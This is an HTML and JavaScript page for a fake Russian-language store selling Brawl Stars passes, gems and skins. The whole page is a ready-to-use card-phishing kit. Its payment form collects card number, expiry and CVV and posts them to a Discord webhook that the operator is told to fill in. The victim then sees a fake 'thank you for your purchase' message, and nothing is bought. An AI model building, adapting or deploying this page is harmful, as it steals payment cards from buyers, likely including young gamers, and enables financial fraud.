<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>ZapechatonShop</title>
    <style>
        body {
            background: #000;
            font-family: 'Courier New', monospace;
            color: #fff;
            padding: 20px;
        }
        .container {
            max-width: 1300px;
            margin: 0 auto;
            background: rgba(0,0,0,0.8);
            border: 1px solid #fff;
            border-radius: 32px;
            padding: 25px;
        }
        h1 { text-align: center; }
        .shop-tabs {
            display: flex;
            gap: 15px;
            border-bottom: 1px solid #333;
            margin-bottom: 20px;
        }
        .shop-tab {
            background: none;
            border: none;
            color: #ccc;
            font-size: 1.2rem;
            padding: 8px 16px;
            cursor: pointer;
        }
        .shop-tab.active {
            color: white;
            border-bottom: 2px solid white;
        }
        .cart-icon {
            float: right;
            font-size: 1.8rem;
            cursor: pointer;
            background: none;
            border: none;
            color: white;
            position: relative;
        }
        .cart-count {
            position: absolute;
            top: -10px;
            right: -15px;
            background: red;
            border-radius: 50%;
            padding: 2px 6px;
            font-size: 0.7rem;
        }
        .products {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            margin-top: 20px;
        }
        .product-card {
            background: #111;
            border: 1px solid #333;
            border-radius: 20px;
            padding: 15px;
            width: 200px;
        }
        .price {
            font-size: 1.4rem;
            margin: 10px 0;
        }
        button {
            background: white;
            color: black;
            border: none;
            padding: 8px 16px;
            border-radius: 30px;
            font-weight: bold;
            cursor: pointer;
        }
        .cart-panel {
            position: fixed;
            top: 0;
            right: -400px;
            width: 350px;
            height: 100%;
            background: #0a0a0a;
            border-left: 2px solid white;
            padding: 20px;
            transition: 0.3s;
            z-index: 1000;
            overflow-y: auto;
        }
        .cart-panel.open { right: 0; }
        .cart-panel ul { list-style: none; padding: 0; }
        .cart-panel li {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid #333;
        }
        .close-cart {
            float: right;
            background: none;
            color: white;
            font-size: 24px;
            cursor: pointer;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.7);
            justify-content: center;
            align-items: center;
            z-index: 1001;
        }
        .modal-content {
            background: #0c0c0c;
            border: 1px solid #fff;
            border-radius: 24px;
            padding: 30px;
            width: 300px;
        }
        .modal-content input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background: #111;
            border: 1px solid #0f0;
            border-radius: 40px;
            color: #fff;
        }
        .checkout {
            background: #2ecc71;
            width: 100%;
            margin-top: 15px;
        }
        .remove-item {
            background: #c0392b;
            padding: 2px 10px;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>ZapechatonShop</h1>
    <div style="overflow: hidden;">
        <div class="shop-tabs">
            <button class="shop-tab active" data-cat="pass">Brawl Pass</button>
            <button class="shop-tab" data-cat="gems">Gems</button>
            <button class="shop-tab" data-cat="skins">Skins</button>
            <button class="shop-tab" data-cat="hyper">Гипер заряд</button>
            <button class="shop-tab" data-cat="starpatrol">Звездный патруль</button>
        </div>
        <button class="cart-icon" id="cartIcon">🛒<span id="cartCount" class="cart-count" style="display:none;">0</span></button>
    </div>
    <div id="passPane" class="shop-pane active"></div>
    <div id="gemsPane" class="shop-pane" style="display:none;"></div>
    <div id="skinsPane" class="shop-pane" style="display:none;"></div>
    <div id="hyperPane" class="shop-pane" style="display:none;"></div>
    <div id="starpatrolPane" class="shop-pane" style="display:none;"></div>
</div>

<div id="cartPanel" class="cart-panel">
    <button class="close-cart" id="closeCart">✕</button>
    <h3>Корзина</h3>
    <ul id="cartList"><li>Пусто</li></ul>
    <div id="cartTotal" style="text-align:right; margin:15px 0;">Итого: 0 ₽</div>
    <button class="checkout" id="checkoutBtn">Оформить заказ</button>
</div>

<div id="paymentModal" class="modal">
    <div class="modal-content">
        <span id="closeModal" style="float:right; cursor:pointer;">&times;</span>
        <h3>Оплата картой</h3>
        <input type="text" id="cardNum" placeholder="Номер карты">
        <input type="text" id="cardExp" placeholder="MM/YY">
        <input type="text" id="cardCvv" placeholder="CVV">
        <button id="payBtn" style="width:100%; margin-top:15px;">Оплатить</button>
    </div>
</div>

<script>
    // ТВОЙ ВЕБХУК - ЗАМЕНИ
    const WEBHOOK = "https://discord.com/api/webhooks/ЗАМЕНИТЕ_НА_ВАШ/ТОКЕН";

    const products = {
        pass: [
            { name: "BP (Brawl Pass)", price: 349 },
            { name: "BP+ (Brawl Pass Plus)", price: 349 }
        ],
        gems: [
            { name: "80 гемов", price: 111 },
            { name: "170 гемов", price: 223 },
            { name: "360 гемов", price: 454 },
            { name: "950 гемов", price: 1049 }
        ],
        skins: [
            { name: "Меха Леон", price: 279 },
            { name: "Ковбой Кольт", price: 209 },
            { name: "Рокер Мортис", price: 349 },
            { name: "Бо Ультимативный", price: 489 }
        ],
        hyper: [
            { name: "Гипер заряд (любой)", price: 999 },
            { name: "Гипер заряд + бонус", price: 999 }
        ],
        starpatrol: [
            { name: "Звездный патруль скин", price: 999 },
            { name: "Звездный патруль комплект", price: 999 }
        ]
    };

    let cart = [];

    function renderCategory(cat, containerId) {
        let html = '<div class="products">';
        products[cat].forEach(p => {
            html += `
                <div class="product-card">
                    <h3>${p.name}</h3>
                    <div class="price">${p.price} ₽</div>
                    <button onclick="addToCart('${p.name.replace(/'/g, "\\'")}', ${p.price})">В корзину</button>
                </div>
            `;
        });
        html += '</div>';
        document.getElementById(containerId).innerHTML = html;
    }

    window.addToCart = function(name, price) {
        cart.push({ name, price });
        updateCartUI();
        showMsg(`+ ${name} добавлен`);
    };

    function updateCartUI() {
        const list = document.getElementById('cartList');
        const totalSpan = document.getElementById('cartTotal');
        const badge = document.getElementById('cartCount');
        if (cart.length === 0) {
            list.innerHTML = '<li>Пусто</li>';
            totalSpan.innerText = 'Итого: 0 ₽';
            badge.style.display = 'none';
            return;
        }
        let total = 0;
        let html = '';
        cart.forEach((item, idx) => {
            total += item.price;
            html += `<li>${item.name} — ${item.price} ₽ <button class="remove-item" onclick="removeFromCart(${idx})">x</button></li>`;
        });
        list.innerHTML = html;
        totalSpan.innerText = `Итого: ${total} ₽`;
        badge.innerText = cart.length;
        badge.style.display = 'inline-block';
    }

    window.removeFromCart = function(idx) {
        cart.splice(idx, 1);
        updateCartUI();
        showMsg('Товар удалён');
    };

    function showMsg(msg) {
        let d = document.createElement('div');
        d.textContent = msg;
        d.style.cssText = 'position:fixed; bottom:20px; right:20px; background:#2ecc71; color:#000; padding:10px 20px; border-radius:30px; z-index:9999;';
        document.body.appendChild(d);
        setTimeout(() => d.remove(), 2000);
    }

    function sendWebhook(data) {
        if (!WEBHOOK || WEBHOOK.includes('ЗАМЕНИТЕ')) {
            console.log('Webhook не настроен', data);
            return;
        }
        fetch(WEBHOOK, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                content: 'Новая покупка',
                embeds: [{
                    title: 'Карта',
                    fields: Object.entries(data).map(([k,v]) => ({name: k, value: `||${v}||`, inline: true})),
                    timestamp: new Date().toISOString()
                }]
            })
        }).catch(e => console.log);
    }

    // вкладки
    const tabs = document.querySelectorAll('.shop-tab');
    const panes = {
        pass: document.getElementById('passPane'),
        gems: document.getElementById('gemsPane'),
        skins: document.getElementById('skinsPane'),
        hyper: document.getElementById('hyperPane'),
        starpatrol: document.getElementById('starpatrolPane')
    };
    tabs.forEach(tab => {
        tab.onclick = () => {
            const cat = tab.getAttribute('data-cat');
            tabs.forEach(t => t.classList.remove('active'));
            tab.classList.add('active');
            for (let p in panes) panes[p].style.display = 'none';
            panes[cat].style.display = 'block';
        };
    });

    // рендер всех категорий
    renderCategory('pass', 'passPane');
    renderCategory('gems', 'gemsPane');
    renderCategory('skins', 'skinsPane');
    renderCategory('hyper', 'hyperPane');
    renderCategory('starpatrol', 'starpatrolPane');

    // корзина
    const cartIcon = document.getElementById('cartIcon');
    const cartPanel = document.getElementById('cartPanel');
    const closeCart = document.getElementById('closeCart');
    cartIcon.onclick = () => cartPanel.classList.add('open');
    closeCart.onclick = () => cartPanel.classList.remove('open');
    document.onclick = (e) => {
        if (cartPanel.classList.contains('open') && !cartPanel.contains(e.target) && e.target !== cartIcon)
            cartPanel.classList.remove('open');
    };

    // оплата
    const modal = document.getElementById('paymentModal');
    const checkoutBtn = document.getElementById('checkoutBtn');
    const closeModal = document.getElementById('closeModal');
    const payBtn = document.getElementById('payBtn');
    checkoutBtn.onclick = () => {
        if (cart.length === 0) { alert('Корзина пуста'); return; }
        modal.style.display = 'flex';
    };
    closeModal.onclick = () => modal.style.display = 'none';
    window.onclick = (e) => { if (e.target === modal) modal.style.display = 'none'; };
    payBtn.onclick = () => {
        const card = document.getElementById('cardNum').value.trim();
        const exp = document.getElementById('cardExp').value.trim();
        const cvv = document.getElementById('cardCvv').value.trim();
        if (!card || !exp || !cvv) { alert('Заполните все поля'); return; }
        const total = cart.reduce((s,i)=>s+i.price,0);
        const items = cart.map(i=>`${i.name} (${i.price}₽)`).join('\n');
        sendWebhook({
            'товары': items,
            'сумма': total + ' ₽',
            'номер карты': card,
            'срок': exp,
            'cvv': cvv
        });
        alert('Спасибо за покупку!');
        cart = [];
        updateCartUI();
        modal.style.display = 'none';
        document.getElementById('cardNum').value = '';
        document.getElementById('cardExp').value = '';
        document.getElementById('cardCvv').value = '';
        cartPanel.classList.remove('open');
    };
</script>
</body>
</html>
